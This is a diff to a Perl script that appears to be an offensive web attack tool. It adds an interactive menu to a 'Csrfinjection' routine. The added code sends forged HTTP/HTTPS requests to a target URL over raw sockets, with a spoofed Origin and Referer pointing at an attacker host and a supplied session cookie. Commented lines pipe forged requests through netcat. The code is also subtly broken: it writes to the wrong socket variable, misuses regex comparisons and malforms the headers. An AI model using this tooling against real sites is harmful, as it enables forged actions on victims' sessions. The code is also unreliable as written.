@@ -2358,8 +2358,18 @@ sub Csrfinjection ( ) {
 	$| = 1; # Clear the buffer here
 my $ua = LWP::UserAgent->new;
 $ua->agent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0.");
-	print item(),"Caution: You will need java or php file for injection in your server/outbound connection";
-	print "\n";
+	print item(),"Caution: You will need java or php file for injection in your server/outbound connection\n";
+	print item(),"Methods: You can reproduce following:\n";
+	print item(),"Methods: No User Interaction\n";
+	print item(),"Methods: User Interaction\n";
+	print item(),"Methods: HTML AutoSubmit - No User Interaction\n";
+	print item(),"No Support Method: HTML AutoSubmit - User Interaction (See CSRF Templates)\n";
+	print "\n\n";
+	print item(),"1 - HTTP Based Attack\n";
+	print item(),"2 - HTTPS Based Attack\n";
+	print item(),"Enter Option: ";
+	chomp($enter=<STDIN>);
+	if ($enter =~1) {
 	print item(),"Enter URL: ";
 	chomp($url=<STDIN>);
 	print item(),"Enter File Name: ";
@@ -2371,13 +2381,13 @@ $ua->agent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/
 	print item(),"Enter Cookie or leave blank: ";
 	chomp($cookie=<STDIN>);	   
 	print item(),"Enter Parameter1: ";
-	chomp($param1=<STDIN>);	   
-	print item(),"Enter Parameter1 value: ";
-	chomp($paramv1=<STDIN>);	   
-	print item(),"Enter Parameter2: ";
-	chomp($param2=<STDIN>);	   
-	print item(),"Enter Parameter2 value: ";
-	chomp($paramv2=<STDIN>);	   
+	#chomp($param1=<STDIN>);	   
+	#print item(),"Enter Parameter1 value: ";
+	#chomp($paramv1=<STDIN>);	   
+	#print item(),"Enter Parameter2: ";
+	#chomp($param2=<STDIN>);	   
+	#print item(),"Enter Parameter2 value: ";
+	#chomp($paramv2=<STDIN>);	   
 
 use IO::Socket;
 my $sock = new IO::Socket::INET (
@@ -2401,9 +2411,29 @@ print $sock "$values\r\n\r\n";
 
 print while <$sock>;
 close($sock);
+}
 
+if ($enter =~2) {
 
+use IO::Socket::SecureSocks;
+my $socket = IO::Socket::SecureSocks->new(
+                                ConnectAddr => $url,
+								ConnectPort => 443,
+								Timeout     => 10
+                                ) or die "Could not create secure socket: $!\n" unless $sock;
+print $sock "POST /$filename HTTP/1.1\r\n\r\n";
+print $sock "Host: $url\r\n\r\n";
+print $sock "Origin: $attacker\r\n\r\n";
+print $sock "Referer: $attacker/$attackerfile\r\n\r\n";
+print $sock "Cookie: SESSION=$cookie\r\n\r\n";
+print $sock "Content-Type: application/x-www-form-urlencoded\r\n\r\n";
+print $sock "POST /$filename HTTP/1.1\r\n\r\n";
+print $sock "$values\r\n\r\n";
 
+#echo -e "HEAD / HTTP/1.1\nHost: 10.1.1.2\nConnection: close\n\n\n\n" | netcat 10.1.1.2 80
+#echo -e "POST / HTTP/1.1\nHost: google.com\nOrigin: google.com\nReferer: google.com\n Cookie: SESSION=\nContent-Type: application/x-www-form-urlencoded\nhi=hi\n\n\n\n" | netcat 10.1.1.2 80
+
+}
 }
 
 
